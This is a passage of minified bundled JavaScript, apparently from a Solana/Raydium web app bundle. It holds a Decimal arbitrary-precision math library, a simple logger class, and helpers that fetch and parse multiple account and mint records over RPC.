        1 / 0,
      ];
    for (e = 0; e < o.length; e += 3)
      if (void 0 !== (r = t[(n = o[e])])) {
        if (!(Vv(r) === r && r >= o[e + 1] && r <= o[e + 2]))
          throw Error(jv + n + ": " + r);
        this[n] = r;
      }
    if (void 0 !== (r = t[(n = "LN10")])) {
      if (r != Math.LN10) throw Error(jv + n + ": " + r);
      this[n] = new this(r);
    }
    return this;
  }
  var pA = (function t(e) {
    var n, r, o;
    function i(t) {
      var e = this;
      if (!(e instanceof i)) return new i(t);
      if (((e.constructor = i), t instanceof i))
        return (
          (e.s = t.s), (e.e = t.e), (e.d = (t = t.d) ? t.slice() : t), void 0
        );
      if ("number" == typeof t) {
        if (0 * t != 0) throw Error(jv + t);
        if (t > 0) e.s = 1;
        else {
          if (!(t < 0)) return (e.s = 0), (e.e = 0), (e.d = [0]), void 0;
          (t = -t), (e.s = -1);
        }
        return t === ~~t && t < 1e7
          ? ((e.e = 0), (e.d = [t]), void 0)
          : uA(e, t.toString());
      }
      if ("string" != typeof t) throw Error(jv + t);
      if (
        (45 === t.charCodeAt(0) ? ((t = t.slice(1)), (e.s = -1)) : (e.s = 1),
        !Zv.test(t))
      )
        throw Error(jv + t);
      uA(e, t);
    }
    if (
      ((i.prototype = Qv),
      (i.ROUND_UP = 0),
      (i.ROUND_DOWN = 1),
      (i.ROUND_CEIL = 2),
      (i.ROUND_FLOOR = 3),
      (i.ROUND_HALF_UP = 4),
      (i.ROUND_HALF_DOWN = 5),
      (i.ROUND_HALF_EVEN = 6),
      (i.ROUND_HALF_CEIL = 7),
      (i.ROUND_HALF_FLOOR = 8),
      (i.clone = t),
      (i.config = i.set = hA),
      void 0 === e && (e = {}),
      e)
    )
      for (
        o = ["precision", "rounding", "toExpNeg", "toExpPos", "LN10"], n = 0;
        n < o.length;

      )
        e.hasOwnProperty((r = o[n++])) || (e[r] = this[r]);
    return i.config(e), i;
  })({
    precision: 20,
    rounding: 4,
    toExpNeg: -7,
    toExpPos: 21,
    LN10: "2.302585092994045684017991454684364207601101488628772976033327900967572609677352480235997205089598298341967784042286",
  });
  zv = new pA(1);
  const mA = pA;
  var gA,
    yA = Object.defineProperty,
    wA = Object.defineProperties,
    bA = Object.getOwnPropertyDescriptors,
    vA = Object.getOwnPropertySymbols,
    AA = Object.prototype.hasOwnProperty,
    kA = Object.prototype.propertyIsEnumerable,
    IA = (t, e, n) =>
      e in t
        ? yA(t, e, { enumerable: !0, configurable: !0, writable: !0, value: n })
        : (t[e] = n),
    SA = (t, e) => {
      for (var n in e || (e = {})) AA.call(e, n) && IA(t, n, e[n]);
      if (vA) for (var n of vA(e)) kA.call(e, n) && IA(t, n, e[n]);
      return t;
    },
    _A = (t, e) => wA(t, bA(e)),
    TA = (t, e) => {
      var n = {};
      for (var r in t) AA.call(t, r) && e.indexOf(r) < 0 && (n[r] = t[r]);
      if (null != t && vA)
        for (var r of vA(t)) e.indexOf(r) < 0 && kA.call(t, r) && (n[r] = t[r]);
      return n;
    },
    BA =
      (((gA = BA || {})[(gA.Error = 0)] = "Error"),
      (gA[(gA.Warning = 1)] = "Warning"),
      (gA[(gA.Info = 2)] = "Info"),
      (gA[(gA.Debug = 3)] = "Debug"),
      gA),
    CA = class {
      constructor(t) {
        (this.logLevel = void 0 !== t.logLevel ? t.logLevel : 0),
          (this.name = t.name);
      }
      set level(t) {
        this.logLevel = t;
      }
      get time() {
        return Date.now().toString();
      }
      get moduleName() {
        return this.name;
      }
      isLogLevel(t) {
        return t <= this.logLevel;
      }
      error(...t) {
        return this.isLogLevel(0) ? (void 0, this) : this;
      }
      logWithError(...t) {
        let e = t
          .map((t) => ("object" == typeof t ? JSON.stringify(t) : t))
          .join(", ");
        throw new Error(e);
      }
      warning(...t) {
        return this.isLogLevel(1) ? (void 0, this) : this;
      }
      info(...t) {
        return this.isLogLevel(2) ? (void 0, this) : this;
      }
      debug(...t) {
        return this.isLogLevel(3) ? (void 0, this) : this;
      }
    },
    EA = {},
    xA = {};
  function PA(t) {
    let e = kv.get(EA, t);
    if (!e) {
      let n = kv.get(xA, t);
      (e = new CA({ name: t, logLevel: n })), kv.set(EA, t, e);
    }
    return e;
  }
  var OA = PA("Raydium_accountInfo_util");
  async function RA(t, e, n) {
    let {
        batchRequest: r,
        commitment: o = "confirmed",
        chunkCount: i = 100,
      } = SA({ batchRequest: !1 }, n),
      s = cS(e, i),
      a = new Array(s.length).fill([]);
    if (r) {
      let e = cS(
        s.map((e) => ({
          methodName: "getMultipleAccounts",
          args: t._buildArgs([e.map((t) => t.toBase58())], o, "base64"),
        })),
        10
      );
      a = (
        await (
          await Promise.all(e.map(async (e) => await t._rpcBatchRequest(e)))
        ).flat()
      ).map(
        (t) => (
          t.error &&
            OA.logWithError(
              `failed to get info for multiple accounts, RPC_ERROR, ${t.error.message}`
            ),
          t.result.value.map((t) => {
            if (t) {
              let {
                data: e,
                executable: n,
                lamports: r,
                owner: o,
                rentEpoch: i,
              } = t;
              return (
                2 !== e.length &&
                  "base64" !== e[1] &&
                  OA.logWithError("info must be base64 encoded, RPC_ERROR"),
                {
                  data: dt.from(e[0], "base64"),
                  executable: n,
                  lamports: r,
                  owner: new Ji(o),
                  rentEpoch: i,
                }
              );
            }
            return null;
          })
        )
      );
    } else
      try {
        a = await Promise.all(s.map((e) => t.getMultipleAccountsInfo(e, o)));
      } catch (u) {
        u instanceof Error &&
          OA.logWithError(
            `failed to get info for multiple accounts, RPC_ERROR, ${u.message}`
          );
      }
    return a.flat();
  }
  async function MA(t, e, n) {
    let r = await RA(
      t,
      e.map((t) => t.pubkey),
      n
    );
    return e.map((t, e) => _A(SA({}, t), { accountInfo: r[e] }));
  }
  var LA,
    NA =
      (((LA = NA || {})[(LA.Uninitialized = 0)] = "Uninitialized"),
      (LA[(LA.Mint = 1)] = "Mint"),
      (LA[(LA.Account = 2)] = "Account"),
      LA);
  async function DA({ connection: t, mints: e, config: n }) {
    var r, o, i;
    if (0 === e.length) return {};
    let s = await MA(
        t,
        e.map((t) => ({ pubkey: HI(t) })),
        n
      ),
      a = {};
    for (let u of s) {
      if (!u.accountInfo || u.accountInfo.data.length < fl) {
        void 0;
        continue;
      }
      let t = hl(
        u.pubkey,
        u.accountInfo,
        null == (r = u.accountInfo) ? void 0 : r.owner
      );
      a[u.pubkey.toString()] = _A(SA({}, t), {
        programId: (null == (o = u.accountInfo) ? void 0 : o.owner) || Bc,
        feeConfig: null != (i = il(t)) ? i : void 0,
      });
    }
    return (a[Ji.default.toBase58()] = a[GI.toBase58()]), a;
  }
  var UA,
    qA,
    zA = 9e15,
    KA = 1e9,
    WA = "0123456789abcdef",
    FA =
      "2.3025850929940456840179914546843642076011014886287729760333279009675726096773524802359972050895982983419677840422862486334095254650828067566662873690987816894829072083255546808437998948262331985283935053089653777326288461633662222876982198867465436674744042432743651550489343149393914796194044002221051017141748003688084012647080685567743216228355220114804663715659121373450747856947683463616792101806445070648000277502684916746550586856935673420670581136429224554405758925724208241314695689016758940256776311356919292033376587141660230105703089634572075440370847469940168269282808481184289314848524948644871927809676271275775397027668605952496716674183485704422507197965004714951050492214776567636938662976979522110718264549734772662425709429322582798502585509785265383207606726317164309505995087807523710333101197857547331541421808427543863591778117054309827482385045648019095610299291824318237525357709750539565187697510374970888692180205189339507238539205144634197265287286965110862571492198849978748873771345686209167058",
    jA =
      "3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091456485669234603486104543266482133936072602491412737245870066063155881748815209209628292540917153643678925903600113305305488204665213841469519415116094330572703657595919530921861173819326117931051185480744623799627495673518857527248912279381830119491298336733624406566430860213949463952247371907021798609437027705392171762931767523846748184676694051320005681271452635608277857713427577896091736371787214684409012249534301465495853710507922796892589235420199561121290219608640344181598136297747713099605187072113499999983729780499510597317328160963185950244594553469083026425223082533446850352619311881710100031378387528865875332083814206171776691473035982534904287554687311595628638823537875937519577818577805321712268066130019278766111959092164201989380952572010654858632789",
    GA = {
      precision: 20,
      rounding: 4,
      modulo: 1,
      toExpNeg: -7,
      toExpPos: 21,
      minE: -zA,
      maxE: zA,
      crypto: !1,
    },
    VA = !0,
    HA = "[DecimalError] ",
    ZA = HA + "Invalid argument: ",
    XA = HA + "Precision limit exceeded",
    JA = HA + "crypto unavailable",
    YA = "[object Decimal]",
    QA = Math.floor,
    $A = Math.pow,
    tk = /^0b([01]+(\.[01]*)?|\.[01]+)(p[+-]?\d+)?$/i,
    ek = /^0x([0-9a-f]+(\.[0-9a-f]*)?|\.[0-9a-f]+)(p[+-]?\d+)?$/i,
    nk = /^0o([0-7]+(\.[0-7]*)?|\.[0-7]+)(p[+-]?\d+)?$/i,
    rk = /^(\d+(\.\d*)?|\.\d+)(e[+-]?\d+)?$/i,
    ok = 1e7,
    ik = FA.length - 1,
    sk = jA.length - 1,
    ak = { toStringTag: YA };
  function uk(t) {
    var e,
      n,
      r,
      o = t.length - 1,
      i = "",
      s = t[0];
    if (o > 0) {
      for (i += s, e = 1; e < o; e++)
        (n = 7 - (r = t[e] + "").length) && (i += bk(n)), (i += r);
      (n = 7 - (r = (s = t[e]) + "").length) && (i += bk(n));
    } else if (0 === s) return "0";
    for (; s % 10 == 0; ) s /= 10;
    return i + s;
  }
  function ck(t, e, n) {
    if (t !== ~~t || t < e || t > n) throw Error(ZA + t);
  }
  function lk(t, e, n, r) {
    var o, i, s, a;
    for (i = t[0]; i >= 10; i /= 10) --e;
    return (
      --e < 0 ? ((e += 7), (o = 0)) : ((o = Math.ceil((e + 1) / 7)), (e %= 7)),
      (i = $A(10, 7 - e)),
      (a = t[o] % i | 0),
      null == r
        ? e < 3
          ? (0 == e ? (a = (a / 100) | 0) : 1 == e && (a = (a / 10) | 0),
            (s =
              (n < 4 && 99999 == a) ||
              (n > 3 && 49999 == a) ||
              5e4 == a ||
              0 == a))
          : (s =
              (((n < 4 && a + 1 == i) || (n > 3 && a + 1 == i / 2)) &&
                ((t[o + 1] / i / 100) | 0) == $A(10, e - 2) - 1) ||
              ((a == i / 2 || 0 == a) && !((t[o + 1] / i / 100) | 0)))
        : e < 4
        ? (0 == e
            ? (a = (a / 1e3) | 0)
            : 1 == e
            ? (a = (a / 100) | 0)
            : 2 == e && (a = (a / 10) | 0),
          (s = ((r || n < 4) && 9999 == a) || (!r && n > 3 && 4999 == a)))
        : (s =
            (((r || n < 4) && a + 1 == i) || (!r && n > 3 && a + 1 == i / 2)) &&
            ((t[o + 1] / i / 1e3) | 0) == $A(10, e - 3) - 1),
      s
    );
  }
  function dk(t, e, n) {
    for (var r, o, i = [0], s = 0, a = t.length; s < a; ) {
      for (o = i.length; o--; ) i[o] *= e;
      for (i[0] += WA.indexOf(t.charAt(s++)), r = 0; r < i.length; r++)
        i[r] > n - 1 &&
          (void 0 === i[r + 1] && (i[r + 1] = 0),
          (i[r + 1] += (i[r] / n) | 0),
          (i[r] %= n));
    }
    return i.reverse();
  }
  (ak.absoluteValue = ak.abs =
    function () {
      var t = new this.constructor(this);
      return t.s < 0 && (t.s = 1), hk(t);
    }),
    (ak.ceil = function () {
      return hk(new this.constructor(this), this.e + 1, 2);
    }),
    (ak.clampedTo = ak.clamp =
      function (t, e) {
        var n = this,
          r = n.constructor;
        if (((t = new r(t)), (e = new r(e)), !t.s || !e.s)) return new r(NaN);
        if (t.gt(e)) throw Error(ZA + e);
        return n.cmp(t) < 0 ? t : n.cmp(e) > 0 ? e : new r(n);
      }),
    (ak.comparedTo = ak.cmp =
      function (t) {
        var e,
          n,
          r,
          o,
          i = this,
          s = i.d,
          a = (t = new i.constructor(t)).d,
          u = i.s,
          c = t.s;
        if (!s || !a)
          return u && c
            ? u !== c
              ? u
              : s === a
              ? 0
              : !s ^ (u < 0)
              ? 1
              : -1
            : NaN;
        if (!s[0] || !a[0]) return s[0] ? u : a[0] ? -c : 0;
        if (u !== c) return u;
        if (i.e !== t.e) return (i.e > t.e) ^ (u < 0) ? 1 : -1;
        for (e = 0, n = (r = s.length) < (o = a.length) ? r : o; e < n; ++e)
          if (s[e] !== a[e]) return (s[e] > a[e]) ^ (u < 0) ? 1 : -1;
        return r === o ? 0 : (r > o) ^ (u < 0) ? 1 : -1;
      }),
    (ak.cosine = ak.cos =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return n.d
          ? n.d[0]
            ? ((t = r.precision),
              (e = r.rounding),
              (r.precision = t + Math.max(n.e, n.sd()) + 7),
              (r.rounding = 1),
              (n = (function (t, e) {
                var n, r, o;
                if (e.isZero()) return e;
                (r = e.d.length),
                  r < 32
                    ? ((n = Math.ceil(r / 3)), (o = (1 / Ck(4, n)).toString()))
                    : ((n = 16), (o = "2.3283064365386962890625e-10")),
                  (t.precision += n),
                  (e = Bk(t, 1, e.times(o), new t(1)));
                for (var i = n; i--; ) {
                  var s = e.times(e);
                  e = s.times(s).minus(s).times(8).plus(1);
                }
                return (t.precision -= n), e;
              })(r, Ek(r, n))),
              (r.precision = t),
              (r.rounding = e),
              hk(2 == qA || 3 == qA ? n.neg() : n, t, e, !0))
            : new r(1)
          : new r(NaN);
      }),
    (ak.cubeRoot = ak.cbrt =
      function () {
        var t,
          e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c,
          l = this,
          d = l.constructor;
        if (!l.isFinite() || l.isZero()) return new d(l);
        for (
          VA = !1,
            (i = l.s * $A(l.s * l, 1 / 3)) && Math.abs(i) != 1 / 0
              ? (r = new d(i.toString()))
              : ((n = uk(l.d)),
                (i = ((t = l.e) - n.length + 1) % 3) &&
                  (n += 1 == i || -2 == i ? "0" : "00"),
                (i = $A(n, 1 / 3)),
                (t = QA((t + 1) / 3) - (t % 3 == (t < 0 ? -1 : 2))),
                i == 1 / 0
                  ? (n = "5e" + t)
                  : (n =
                      (n = i.toExponential()).slice(0, n.indexOf("e") + 1) + t),
                ((r = new d(n)).s = l.s)),
            s = (t = d.precision) + 3;
          ;

        )
          if (
            ((c = (u = (a = r).times(a).times(a)).plus(l)),
            (r = fk(c.plus(l).times(a), c.plus(u), s + 2, 1)),
            uk(a.d).slice(0, s) === (n = uk(r.d)).slice(0, s))
          ) {
            if ("9999" != (n = n.slice(s - 3, s + 1)) && (o || "4999" != n)) {
              (!+n || (!+n.slice(1) && "5" == n.charAt(0))) &&
                (hk(r, t + 1, 1), (e = !r.times(r).times(r).eq(l)));
              break;
            }
            if (!o && (hk(a, t + 1, 0), a.times(a).times(a).eq(l))) {
              r = a;
              break;
            }
            (s += 4), (o = 1);
          }
        return (VA = !0), hk(r, t, d.rounding, e);
      }),
    (ak.decimalPlaces = ak.dp =
      function () {
        var t,
          e = this.d,
          n = NaN;
        if (e) {
          if (((n = 7 * ((t = e.length - 1) - QA(this.e / 7))), (t = e[t])))
            for (; t % 10 == 0; t /= 10) n--;
          n < 0 && (n = 0);
        }
        return n;
      }),
    (ak.dividedBy = ak.div =
      function (t) {
        return fk(this, new this.constructor(t));
      }),
    (ak.dividedToIntegerBy = ak.divToInt =
      function (t) {
        var e = this.constructor;
        return hk(fk(this, new e(t), 0, 1, 1), e.precision, e.rounding);
      }),
    (ak.equals = ak.eq =
      function (t) {
        return 0 === this.cmp(t);
      }),
    (ak.floor = function () {
      return hk(new this.constructor(this), this.e + 1, 3);
    }),
    (ak.greaterThan = ak.gt =
      function (t) {
        return this.cmp(t) > 0;
      }),
    (ak.greaterThanOrEqualTo = ak.gte =
      function (t) {
        var e = this.cmp(t);
        return 1 == e || 0 === e;
      }),
    (ak.hyperbolicCosine = ak.cosh =
      function () {
        var t,
          e,
          n,
          r,
          o,
          i = this,
          s = i.constructor,
          a = new s(1);
        if (!i.isFinite()) return new s(i.s ? 1 / 0 : NaN);
        if (i.isZero()) return a;
        (n = s.precision),
          (r = s.rounding),
          (s.precision = n + Math.max(i.e, i.sd()) + 4),
          (s.rounding = 1),
          (o = i.d.length) < 32
            ? (e = (1 / Ck(4, (t = Math.ceil(o / 3)))).toString())
            : ((t = 16), (e = "2.3283064365386962890625e-10")),
          (i = Bk(s, 1, i.times(e), new s(1), !0));
        for (var u, c = t, l = new s(8); c--; )
          (u = i.times(i)), (i = a.minus(u.times(l.minus(u.times(l)))));
        return hk(i, (s.precision = n), (s.rounding = r), !0);
      }),
    (ak.hyperbolicSine = ak.sinh =
      function () {
        var t,
          e,
          n,
          r,
          o = this,
          i = o.constructor;
        if (!o.isFinite() || o.isZero()) return new i(o);
        if (
          ((e = i.precision),
          (n = i.rounding),
          (i.precision = e + Math.max(o.e, o.sd()) + 4),
          (i.rounding = 1),
          (r = o.d.length) < 3)
        )
          o = Bk(i, 2, o, o, !0);
        else {
          (t = (t = 1.4 * Math.sqrt(r)) > 16 ? 16 : 0 | t),
            (o = Bk(i, 2, (o = o.times(1 / Ck(5, t))), o, !0));
          for (var s, a = new i(5), u = new i(16), c = new i(20); t--; )
            (s = o.times(o)),
              (o = o.times(a.plus(s.times(u.times(s).plus(c)))));
        }
        return (i.precision = e), (i.rounding = n), hk(o, e, n, !0);
      }),
    (ak.hyperbolicTangent = ak.tanh =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return n.isFinite()
          ? n.isZero()
            ? new r(n)
            : ((t = r.precision),
              (e = r.rounding),
              (r.precision = t + 7),
              (r.rounding = 1),
              fk(n.sinh(), n.cosh(), (r.precision = t), (r.rounding = e)))
          : new r(n.s);
      }),
    (ak.inverseCosine = ak.acos =
      function () {
        var t,
          e = this,
          n = e.constructor,
          r = e.abs().cmp(1),
          o = n.precision,
          i = n.rounding;
        return -1 !== r
          ? 0 === r
            ? e.isNeg()
              ? yk(n, o, i)
              : new n(0)
            : new n(NaN)
          : e.isZero()
          ? yk(n, o + 4, i).times(0.5)
          : ((n.precision = o + 6),
            (n.rounding = 1),
            (e = e.asin()),
            (t = yk(n, o + 4, i).times(0.5)),
            (n.precision = o),
            (n.rounding = i),
            t.minus(e));
      }),
    (ak.inverseHyperbolicCosine = ak.acosh =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return n.lte(1)
          ? new r(n.eq(1) ? 0 : NaN)
          : n.isFinite()
          ? ((t = r.precision),
            (e = r.rounding),
            (r.precision = t + Math.max(Math.abs(n.e), n.sd()) + 4),
            (r.rounding = 1),
            (VA = !1),
            (n = n.times(n).minus(1).sqrt().plus(n)),
            (VA = !0),
            (r.precision = t),
            (r.rounding = e),
            n.ln())
          : new r(n);
      }),
    (ak.inverseHyperbolicSine = ak.asinh =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return !n.isFinite() || n.isZero()
          ? new r(n)
          : ((t = r.precision),
            (e = r.rounding),
            (r.precision = t + 2 * Math.max(Math.abs(n.e), n.sd()) + 6),
            (r.rounding = 1),
            (VA = !1),
            (n = n.times(n).plus(1).sqrt().plus(n)),
            (VA = !0),
            (r.precision = t),
            (r.rounding = e),
            n.ln());
      }),
    (ak.inverseHyperbolicTangent = ak.atanh =
      function () {
        var t,
          e,
          n,
          r,
          o = this,
          i = o.constructor;
        return o.isFinite()
          ? o.e >= 0
            ? new i(o.abs().eq(1) ? o.s / 0 : o.isZero() ? o : NaN)
            : ((t = i.precision),
              (e = i.rounding),
              (r = o.sd()),
              Math.max(r, t) < 2 * -o.e - 1
                ? hk(new i(o), t, e, !0)
                : ((i.precision = n = r - o.e),
                  (o = fk(o.plus(1), new i(1).minus(o), n + t, 1)),
                  (i.precision = t + 4),
                  (i.rounding = 1),
                  (o = o.ln()),
                  (i.precision = t),
                  (i.rounding = e),
                  o.times(0.5)))
          : new i(NaN);
      }),
    (ak.inverseSine = ak.asin =
      function () {
        var t,
          e,
          n,
          r,
          o = this,
          i = o.constructor;
        return o.isZero()
          ? new i(o)
          : ((e = o.abs().cmp(1)),
            (n = i.precision),
            (r = i.rounding),
            -1 !== e
              ? 0 === e
                ? (((t = yk(i, n + 4, r).times(0.5)).s = o.s), t)
                : new i(NaN)
              : ((i.precision = n + 6),
                (i.rounding = 1),
                (o = o.div(new i(1).minus(o.times(o)).sqrt().plus(1)).atan()),
                (i.precision = n),
                (i.rounding = r),
                o.times(2)));
      }),
    (ak.inverseTangent = ak.atan =
      function () {
        var t,
          e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c = this,
          l = c.constructor,
          d = l.precision,
          f = l.rounding;
        if (c.isFinite()) {
          if (c.isZero()) return new l(c);
          if (c.abs().eq(1) && d + 4 <= sk)
            return ((s = yk(l, d + 4, f).times(0.25)).s = c.s), s;
        } else {
          if (!c.s) return new l(NaN);
          if (d + 4 <= sk) return ((s = yk(l, d + 4, f).times(0.5)).s = c.s), s;
        }
        for (
          l.precision = a = d + 10,
            l.rounding = 1,
            t = n = Math.min(28, (a / 7 + 2) | 0);
          t;
          --t
        )
          c = c.div(c.times(c).plus(1).sqrt().plus(1));
        for (
          VA = !1,
            e = Math.ceil(a / 7),
            r = 1,
            u = c.times(c),
            s = new l(c),
            o = c;
          -1 !== t;

        )
          if (
            ((o = o.times(u)),
            (i = s.minus(o.div((r += 2)))),
            (o = o.times(u)),
            void 0 !== (s = i.plus(o.div((r += 2)))).d[e])
          )
            for (t = e; s.d[t] === i.d[t] && t--; );
        return (
          n && (s = s.times(2 << (n - 1))),
          (VA = !0),
          hk(s, (l.precision = d), (l.rounding = f), !0)
        );
      }),
    (ak.isFinite = function () {
      return !!this.d;
    }),
    (ak.isInteger = ak.isInt =
      function () {
        return !!this.d && QA(this.e / 7) > this.d.length - 2;
      }),
    (ak.isNaN = function () {
      return !this.s;
    }),
    (ak.isNegative = ak.isNeg =
      function () {
        return this.s < 0;
      }),
    (ak.isPositive = ak.isPos =
      function () {
        return this.s > 0;
      }),
    (ak.isZero = function () {
      return !!this.d && 0 === this.d[0];
    }),
    (ak.lessThan = ak.lt =
      function (t) {
        return this.cmp(t) < 0;
      }),
    (ak.lessThanOrEqualTo = ak.lte =
      function (t) {
        return this.cmp(t) < 1;
      }),
    (ak.logarithm = ak.log =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c = this,
          l = c.constructor,
          d = l.precision,
          f = l.rounding;
        if (null == t) (t = new l(10)), (e = !0);
        else {
          if (((n = (t = new l(t)).d), t.s < 0 || !n || !n[0] || t.eq(1)))
            return new l(NaN);
          e = t.eq(10);
        }
        if (((n = c.d), c.s < 0 || !n || !n[0] || c.eq(1)))
          return new l(n && !n[0] ? -1 / 0 : 1 != c.s ? NaN : n ? 0 : 1 / 0);
        if (e)
          if (n.length > 1) i = !0;
          else {
            for (o = n[0]; o % 10 == 0; ) o /= 10;
            i = 1 !== o;
          }
        if (
          ((VA = !1),
          (s = Sk(c, (a = d + 5))),
          (r = e ? gk(l, a + 10) : Sk(t, a)),
          lk((u = fk(s, r, a, 1)).d, (o = d), f))
        )
          do {
            if (
              ((s = Sk(c, (a += 10))),
              (r = e ? gk(l, a + 10) : Sk(t, a)),
              (u = fk(s, r, a, 1)),
              !i)
            ) {
              +uk(u.d).slice(o + 1, o + 15) + 1 == 1e14 &&
                (u = hk(u, d + 1, 0));
              break;
            }
          } while (lk(u.d, (o += 10), f));
        return (VA = !0), hk(u, d, f);
      }),
    (ak.minus = ak.sub =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c,
          l,
          d,
          f,
          h = this,
          p = h.constructor;
        if (((t = new p(t)), !h.d || !t.d))
          return (
            h.s && t.s
              ? h.d
                ? (t.s = -t.s)
                : (t = new p(t.d || h.s !== t.s ? h : NaN))
              : (t = new p(NaN)),
            t
          );
        if (h.s != t.s) return (t.s = -t.s), h.plus(t);
        if (
          ((c = h.d),
          (f = t.d),
          (a = p.precision),
          (u = p.rounding),
          !c[0] || !f[0])
        ) {
          if (f[0]) t.s = -t.s;
          else {
            if (!c[0]) return new p(3 === u ? -0 : 0);
            t = new p(h);
          }
          return VA ? hk(t, a, u) : t;
        }
        if (
          ((n = QA(t.e / 7)), (l = QA(h.e / 7)), (c = c.slice()), (i = l - n))
        ) {
          for (
            (d = i < 0)
              ? ((e = c), (i = -i), (s = f.length))
              : ((e = f), (n = l), (s = c.length)),
              i > (r = Math.max(Math.ceil(a / 7), s) + 2) &&
                ((i = r), (e.length = 1)),
              e.reverse(),
              r = i;
            r--;

          )
            e.push(0);
          e.reverse();
        } else {
          for (
            (d = (r = c.length) < (s = f.length)) && (s = r), r = 0;
            r < s;
            r++
          )
            if (c[r] != f[r]) {
              d = c[r] < f[r];
              break;
            }
          i = 0;
        }
        for (
          d && ((e = c), (c = f), (f = e), (t.s = -t.s)),
            s = c.length,
            r = f.length - s;
          r > 0;
          --r
        )
          c[s++] = 0;
        for (r = f.length; r > i; ) {
          if (c[--r] < f[r]) {
            for (o = r; o && 0 === c[--o]; ) c[o] = ok - 1;
            --c[o], (c[r] += ok);
          }
          c[r] -= f[r];
        }
        for (; 0 === c[--s]; ) c.pop();
        for (; 0 === c[0]; c.shift()) --n;
        return c[0]
          ? ((t.d = c), (t.e = mk(c, n)), VA ? hk(t, a, u) : t)
          : new p(3 === u ? -0 : 0);
      }),
    (ak.modulo = ak.mod =
      function (t) {
        var e,
          n = this,
          r = n.constructor;
        return (
          (t = new r(t)),
          !n.d || !t.s || (t.d && !t.d[0])
            ? new r(NaN)
            : !t.d || (n.d && !n.d[0])
            ? hk(new r(n), r.precision, r.rounding)
            : ((VA = !1),
              9 == r.modulo
                ? ((e = fk(n, t.abs(), 0, 3, 1)).s *= t.s)
                : (e = fk(n, t, 0, r.modulo, 1)),
              (e = e.times(t)),
              (VA = !0),
              n.minus(e))
        );
      }),
    (ak.naturalExponential = ak.exp =
      function () {
        return Ik(this);
      }),
    (ak.naturalLogarithm = ak.ln =
      function () {
        return Sk(this);
      }),
    (ak.negated = ak.neg =
      function () {
        var t = new this.constructor(this);
        return (t.s = -t.s), hk(t);
      }),
    (ak.plus = ak.add =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c,
          l,
          d = this,
          f = d.constructor;
        if (((t = new f(t)), !d.d || !t.d))
          return (
            d.s && t.s
              ? d.d || (t = new f(t.d || d.s === t.s ? d : NaN))
              : (t = new f(NaN)),
            t
          );
        if (d.s != t.s) return (t.s = -t.s), d.minus(t);
        if (
          ((c = d.d),
          (l = t.d),
          (a = f.precision),
          (u = f.rounding),
          !c[0] || !l[0])
        )
          return l[0] || (t = new f(d)), VA ? hk(t, a, u) : t;
        if (
          ((i = QA(d.e / 7)), (r = QA(t.e / 7)), (c = c.slice()), (o = i - r))
        ) {
          for (
            o < 0
              ? ((n = c), (o = -o), (s = l.length))
              : ((n = l), (r = i), (s = c.length)),
              o > (s = (i = Math.ceil(a / 7)) > s ? i + 1 : s + 1) &&
                ((o = s), (n.length = 1)),
              n.reverse();
            o--;

          )
            n.push(0);
          n.reverse();
        }
        for (
          (s = c.length) - (o = l.length) < 0 &&
            ((o = s), (n = l), (l = c), (c = n)),
            e = 0;
          o;

        )
          (e = ((c[--o] = c[o] + l[o] + e) / ok) | 0), (c[o] %= ok);
        for (e && (c.unshift(e), ++r), s = c.length; 0 == c[--s]; ) c.pop();
        return (t.d = c), (t.e = mk(c, r)), VA ? hk(t, a, u) : t;
      }),
    (ak.precision = ak.sd =
      function (t) {
        var e,
          n = this;
        if (void 0 !== t && t !== !!t && 1 !== t && 0 !== t)
          throw Error(ZA + t);
        return (
          n.d ? ((e = wk(n.d)), t && n.e + 1 > e && (e = n.e + 1)) : (e = NaN),
          e
        );
      }),
    (ak.round = function () {
      var t = this,
        e = t.constructor;
      return hk(new e(t), t.e + 1, e.rounding);
    }),
    (ak.sine = ak.sin =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return n.isFinite()
          ? n.isZero()
            ? new r(n)
            : ((t = r.precision),
              (e = r.rounding),
              (r.precision = t + Math.max(n.e, n.sd()) + 7),
              (r.rounding = 1),
              (n = (function (t, e) {
                var n,
                  r = e.d.length;
                if (r < 3) return e.isZero() ? e : Bk(t, 2, e, e);
                (n = 1.4 * Math.sqrt(r)),
                  (n = n > 16 ? 16 : 0 | n),
                  (e = e.times(1 / Ck(5, n))),
                  (e = Bk(t, 2, e, e));
                for (var o, i = new t(5), s = new t(16), a = new t(20); n--; )
                  (o = e.times(e)),
                    (e = e.times(i.plus(o.times(s.times(o).minus(a)))));
                return e;
              })(r, Ek(r, n))),
              (r.precision = t),
              (r.rounding = e),
              hk(qA > 2 ? n.neg() : n, t, e, !0))
          : new r(NaN);
      }),
    (ak.squareRoot = ak.sqrt =
      function () {
        var t,
          e,
          n,
          r,
          o,
          i,
          s = this,
          a = s.d,
          u = s.e,
          c = s.s,
          l = s.constructor;
        if (1 !== c || !a || !a[0])
          return new l(!c || (c < 0 && (!a || a[0])) ? NaN : a ? s : 1 / 0);
        for (
          VA = !1,
            0 == (c = Math.sqrt(+s)) || c == 1 / 0
              ? (((e = uk(a)).length + u) % 2 == 0 && (e += "0"),
                (c = Math.sqrt(e)),
                (u = QA((u + 1) / 2) - (u < 0 || u % 2)),
                c == 1 / 0
                  ? (e = "5e" + u)
                  : (e =
                      (e = c.toExponential()).slice(0, e.indexOf("e") + 1) + u),
                (r = new l(e)))
              : (r = new l(c.toString())),
            n = (u = l.precision) + 3;
          ;

        )
          if (
            ((r = (i = r).plus(fk(s, i, n + 2, 1)).times(0.5)),
            uk(i.d).slice(0, n) === (e = uk(r.d)).slice(0, n))
          ) {
            if ("9999" != (e = e.slice(n - 3, n + 1)) && (o || "4999" != e)) {
              (!+e || (!+e.slice(1) && "5" == e.charAt(0))) &&
                (hk(r, u + 1, 1), (t = !r.times(r).eq(s)));
              break;
            }
